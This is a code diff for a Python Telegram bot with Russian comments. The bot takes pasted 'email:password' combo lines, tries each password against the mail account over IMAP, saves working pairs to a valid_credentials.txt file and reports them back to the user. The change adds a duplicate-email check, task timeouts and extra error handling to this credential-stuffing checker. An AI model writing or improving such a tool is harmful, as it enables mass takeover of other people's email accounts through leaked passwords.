@@ -67,6 +67,19 @@ async def add_unique_credentials(email, password):
                 file.write(f'{email}:{password}\n')
                 return True
     return False
+async def check_unique_credentials(email):
+    async with file_lock:
+        # Пытаемся прочитать существующие учетные данные
+        try:
+            with open('valid_credentials.txt', 'r+') as file:
+                existing_credentials = file.read()
+                # Проверяем, есть ли уже такая комбинация email:password
+                if f'{email}'  in existing_credentials:
+                    return False
+        except FileNotFoundError:
+
+            return True
+    return True
 # Асинхронная функция для обработки строк с учетными данными
 async def handle_lines(credentials, message,cancel_event:asyncio.Event=None):
     status_message = await message.reply('Checking credentials... press /cancel for cancel')
@@ -83,40 +96,51 @@ async def handle_lines(credentials, message,cancel_event:asyncio.Event=None):
                 t=asyncio.create_task( check_and_answer(cred, executor, loop, message))
                 tasks.append(t)
 
-            results = await asyncio.gather(*tasks, return_exceptions=True)
+            results,undone = await asyncio.wait(tasks, timeout=30)
+            if undone:
+                await message.reply(f'ERROR {len(undone)} credentials not processed yet {len(results)}/{len(results)+len(undone)}')
     except:
         await message.reply(traceback.format_exc())
 
 
 async def check_and_answer(cred, executor, loop, message):
-    parts = re.split(r'[ :;|]+', cred)
-    email = parts[0]
-    passwords = parts[1:]
-    errors = []
-    valid_found = False
-    for password in passwords:
-        if not is_possible_password(password):
-            errors.append(f'Password format invalid for {password}.')
-            continue
-        try:
-            is_valid,error_text = await loop.run_in_executor(executor, is_email_valid, email, password)
-            if is_valid:
-                credential_added = await add_unique_credentials(email, password)
-                valid_found = True
-                await message.reply(
-                    text=f'\nValid credentials found and saved: <code>{email}</code>:<code>{password}</code>'
-                    , parse_mode='HTML')
+    try:
+        parts = re.split(r'[ :;|]+', cred)
+        email = parts[0]
+        passwords = parts[1:]
+        errors = []
+        valid_found = False
+        is_unique=await check_unique_credentials(email)
+        if not is_unique:
+            return await message.reply(f'email {email} existed before', parse_mode='HTML')
 
-                break
-            else:
-                errors.append(f'Error with password <code>{password}</code>   \n <code>{str(error_text)}</code>')
-        except (EmailException,imaplib.IMAP4) as e:  # Используем Exception для перехвата всех видов ошибок
-            errors.append(f'Error with password <code>{password}</code>   \n <code>{str(e)}</code>')
-        except:
-            errors.append(f'Program not working correctly {traceback.format_exc(3,False)}')
-    if not valid_found:
-        error_text = '\n'.join(errors)
-        await message.reply((f'No valid credentials found for {email}. Errors:\n{error_text}')[:4096], parse_mode='HTML')
+        for password in passwords:
+            if not is_possible_password(password):
+                errors.append(f'Password format invalid for {password}.')
+                continue
+            try:
+                is_valid,error_text = await loop.run_in_executor(executor, is_email_valid, email, password)
+                if is_valid:
+                    credential_added = await add_unique_credentials(email, password)
+                    valid_found = True
+                    await message.reply(
+                        text=f'\nValid credentials found and saved: <code>{email}</code>:<code>{password}</code>'
+                        , parse_mode='HTML')
+
+                    break
+                else:
+                    errors.append(f'Error with password <code>{password}</code>   \n <code>{str(error_text)}</code>')
+            except (EmailException,imaplib.IMAP4.error) as e:  # Используем Exception для перехвата всех видов ошибок
+                errors.append(f'Error with password <code>{password}</code>   \n <code>{str(e)}</code>')
+            except:
+                errors.append(f'Program not working correctly {traceback.format_exc(8,True)}')
+        if not valid_found:
+            error_text = '\n'.join(errors)
+            await message.reply((f'No valid credentials found for {email}. Errors:\n{error_text}')[:4096], parse_mode='HTML')
+    except:
+        error_text =traceback.format_exc()
+        logging.error(error_text)
+        await message.reply(error_text[:4096])
 
 
 # Регулярное выражение для проверки email
@@ -146,4 +170,4 @@ async def handle_document(message: types.Message):
 if __name__ == '__main__':
     logging.basicConfig(level='INFO')
     # Запуск бота
-    executor.start_polling(dp)
+    executor.start_polling(dp,skip_updates=False,fast=False,timeout=30,relax=0.5)
